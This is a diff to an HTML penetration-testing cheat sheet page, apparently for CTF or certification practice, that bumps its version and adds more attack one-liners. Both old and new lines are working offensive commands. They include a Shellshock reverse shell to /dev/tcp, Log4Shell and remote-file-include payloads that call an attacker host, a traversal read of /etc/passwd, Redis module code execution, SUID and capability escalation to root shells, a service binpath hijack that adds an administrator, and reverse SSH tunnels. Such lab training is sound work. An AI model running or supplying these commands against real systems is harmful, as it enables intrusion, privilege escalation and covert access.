@@ -100,7 +100,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.4.1</span>
+  <span class="ver">v1.4.2</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -185,6 +185,7 @@ wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # 
 #   username[$ne]=x&amp;password[$ne]=x        |  username[$regex]=^admin
 # Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
 # LFI-&gt;RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
+curl --path-as-is &quot;http://$IP/../../../../etc/passwd&quot;   # curl strips ../ without this; matters on loopback services
 # Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1&#x27;
 # Log4Shell (any logged field):  ${jndi:ldap://&lt;lhost&gt;/x}     (marshalsec/JNDIExploit for the payload class)
 # GraphQL introspection:  POST /graphql {&quot;query&quot;:&quot;{__schema{types{name fields{name}}}}&quot;}   (InQL, graphw00f)
@@ -192,6 +193,7 @@ wpscan --url http://$IP -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt   # 
 # WebDAV:  davtest -url http://&lt;ip&gt;   ;  curl -T shell.php http://&lt;ip&gt;/   (upload .txt then MOVE if filtered)
 # Jenkins /script (Groovy):  println &#x27;id&#x27;.execute().text
 # Redis unauth -&gt; SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x &#x27;&lt;pubkey&gt;&#x27; ; save
+# Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec &#x27;id&#x27;   (RedisModules-ExecuteCommand)
 # Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
 # RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
 #   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
@@ -327,11 +329,17 @@ copy \\$LHOST\share\file.exe                 # target</code></pre></div>
 ./linpeas.sh | tee linpeas.txt
 sudo -l
 find / -perm -4000 -type f 2&gt;/dev/null       # SUID
-getcap -r / 2&gt;/dev/null                       # capabilities
+getcap -r / 2&gt;/dev/null                       # capabilities (NOT shown by find -perm -4000)
+# SUID entry on GTFOBins? sh/bash drop the euid unless you pass -p:
+/opt/suidfind . -exec /bin/sh -p \; -quit     # and SUID interpreters:
+php -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;       # gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27; -ex quit
+# cap_setuid=ep on an interpreter -&gt; set uid 0 yourself:
+python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;
 crontab -l; cat /etc/crontab
 # check GTFOBins for anything you find in sudo -l or SUID
 ./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
 sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
+sudo --version                                 # &lt; 1.9.5p2 -&gt; Baron Samedit CVE-2021-3156, any local user, no sudo rule
 # root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
 # root &#x27;tar ... *&#x27; in a writable dir -&gt; touch -- &#x27;--checkpoint=1&#x27; &#x27;--checkpoint-action=exec=sh x.sh&#x27;
 # root job runs git in a repo you can write -&gt; .git/hooks/pre-commit (or post-commit), chmod +x, runs as root
@@ -351,10 +359,15 @@ id                                             # disk -&gt; debugfs /dev/sda1 (r
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -&gt; potato
 systeminfo                                    # then windows-exploit-suggester
+# PoC is C source and the target has no compiler? cross-compile on Kali:
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
 accesschk.exe -uwcqv &lt;user&gt; *                 # services you may reconfigure
 sc config &lt;svc&gt; binpath= &quot;cmd /c net localgroup administrators &lt;user&gt; /add&quot; &amp;&amp; sc start &lt;svc&gt;
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
-# open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http &lt;ip&gt; 3128</code></pre></div>
+# open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http &lt;ip&gt; 3128
+# Windows foothold, no sshd? dial out instead - it ships an OpenSSH *client*:
+ssh -R 1080 -N &lt;user&gt;@$LHOST                   # older boxes: plink.exe -ssh -l &lt;u&gt; -pw &lt;p&gt; -R 1080 $LHOST
+netsh interface portproxy add v4tov4 listenport=9999 connectaddress=&lt;internal&gt; connectport=3389   # admin, no upload</code></pre></div>
 <h2 id="container-escape">Container escape</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code># am I in a container, and which runtime?
 ls -la /.dockerenv /run/.containerenv 2&gt;/dev/null   # docker / podman
